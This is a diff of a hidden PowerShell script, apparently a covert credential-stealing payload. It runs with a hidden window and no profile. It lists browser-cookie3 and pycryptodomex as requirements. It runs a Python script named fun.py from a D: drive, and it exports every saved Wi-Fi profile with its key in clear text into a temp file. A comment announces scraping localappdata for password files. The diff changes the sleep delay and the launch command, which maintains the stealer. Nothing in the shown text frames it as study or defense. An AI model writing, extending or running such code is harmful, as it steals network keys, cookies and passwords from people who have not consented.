@@ -1,7 +1,7 @@
 powershell -w hidden -nop -noni
 #pip install pycryptodomex pywin32 browser-cookie3 requests
-Start-Sleep -Seconds 5
-cmd.exe /c "D: && cd D:\Scripts && py fun.py" # instead of downloading something, just use the 128 gigs on the D:\ and run it there
+Start-Sleep -Seconds 7
+& "D:\Python\python.exe" "D:\Scripts\fun.py" # instead of downloading something, just use the 128 gigs on the D:\ and run it there
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
 
 #scrape the localappdata for password files
